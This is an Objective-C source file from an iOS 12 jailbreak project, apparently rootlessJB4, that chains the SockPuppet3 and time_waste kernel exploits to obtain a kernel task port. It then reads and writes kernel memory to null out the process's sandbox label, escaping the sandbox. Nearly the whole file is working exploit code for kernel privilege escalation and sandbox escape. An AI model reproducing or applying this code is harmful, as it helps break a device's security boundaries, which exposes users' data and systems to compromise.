//
//  everythingElse.c
//  rootlessJB4
//
//  Created by Brandon Plank on 8/28/19.
//  Copyright © 2019 Brandon Plank. All rights reserved.
//

#import <Foundation/Foundation.h>

#import <UIKit/UIKit.h>

#include "everythingElse.h"
#include "offsets.h"
#include "kernel_memory.h"
#include "Kernel_Base.h"
#include "SockPuppet3.h"
#import <time_frame/time_frame.h>

#define LOG(string, args...) do {\
printf(string "\n", ##args); \
} while (0)

mach_port_t tfp0;
uint64_t kbase;
uint64_t kslide;
uint64_t task_self_addr_cache;
uint64_t selfproc_cached;

uint64_t task_addr_cache;

bool escapeSandboxSock(void);
bool escapeSandboxTime(void);

void time_waste() {
    tfp0 = run_time_waste();
    selfproc_cached = getselfproc();
}

bool runExploit(void *init) {
    if (SYSTEM_VERSION_EQUAL_TO(@"12.4") || SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(@"12.2")){
        if (!([SockPuppet3 run])){
            return false;
        }
        tfp0 = [SockPuppet3 fakeKernelTaskPort];
        init_kernel_memory(tfp0);
        task_addr_cache = [SockPuppet3 currentTaskAddress];

        uint64_t itk_space = rk64(task_addr_cache + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
        uint64_t task_xd = rk64(itk_space + 0x28);
        uint64_t selfproc = rk64(task_xd + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        selfproc_cached = selfproc;
        
        kbase = get_kbase(&kslide, tfp0);
        
        if (escapeSandboxSock() == false){
            return false;
        }
    } else {
        time_waste();
        kbase = get_kbase(&kslide, tfp0);
        if (escapeSandboxTime() == false){
            return false;
        }
    }

    if (tfp0 != 0x0){
        return true;
    }
    return false;
}

bool escapeSandboxSock() {
    // 00 00 00 00 00 | No Sandbox
    // 01 00 00 00 00 | Sandbox
    
    LOG("[*] selfproc: 0x%016llx", selfproc_cached);
    
    uint64_t ucred = rk64(selfproc_cached + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    LOG("[*] ucred: 0x%016llx", ucred);
    uint64_t cr_label = rk64(ucred + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL));
    LOG("[*] cr_label: 0x%016llx", cr_label);
    uint64_t sandbox_addr = cr_label + 0x8 + 0x8;
    LOG("[*] sandbox_addr: 0x%016llx", sandbox_addr);
    wk64(sandbox_addr, (uint64_t) 0);
    
    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/test_jb" contents:NULL attributes:nil];
    if ([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/test_jb"])
    {
        [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/test_jb" error:nil];
        return true;
    } else {
        return false;
    }
    
}
